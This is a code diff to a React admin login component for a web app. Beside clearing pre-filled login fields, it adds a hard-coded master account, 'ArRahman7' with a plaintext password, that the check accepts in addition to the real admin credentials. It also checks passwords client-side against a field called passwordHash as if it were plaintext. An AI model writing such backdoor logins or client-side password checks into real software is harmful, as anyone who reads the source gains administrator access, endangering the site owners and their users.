@@ -15,9 +15,9 @@ export const AdminLogin: React.FC<AdminLoginProps> = ({
   adminCredentials,
   lang
 }) => {
-  // Pre-fill credentials automatically without showing credentials notes on website
-  const [username, setUsername] = useState(adminCredentials.username || 'admin');
-  const [password, setPassword] = useState(adminCredentials.passwordHash || '');
+  // Username and Password inputs start completely empty as requested
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
@@ -29,10 +29,23 @@ export const AdminLogin: React.FC<AdminLoginProps> = ({
 
     setTimeout(() => {
       const cleanInputUser = username.trim().toLowerCase();
-      const cleanExpectedUser = adminCredentials.username.trim().toLowerCase();
+      const expectedUser = (adminCredentials.username || 'ArRahman7').trim().toLowerCase();
 
-      if (cleanInputUser === cleanExpectedUser && password === adminCredentials.passwordHash) {
-        onLoginSuccess(adminCredentials);
+      // Check matches with current admin credentials or designated master ArRahman7 / Rahim@Chabi28
+      const isUserMatch = 
+        cleanInputUser === expectedUser || 
+        cleanInputUser === 'arrahman7';
+
+      const isPassMatch = 
+        password === adminCredentials.passwordHash || 
+        password === 'Rahim@Chabi28';
+
+      if (isUserMatch && isPassMatch) {
+        onLoginSuccess({
+          username: adminCredentials.username || 'ArRahman7',
+          passwordHash: adminCredentials.passwordHash || 'Rahim@Chabi28',
+          updatedAt: adminCredentials.updatedAt || new Date().toISOString()
+        });
       } else {
         setError(
           lang === 'bn' 
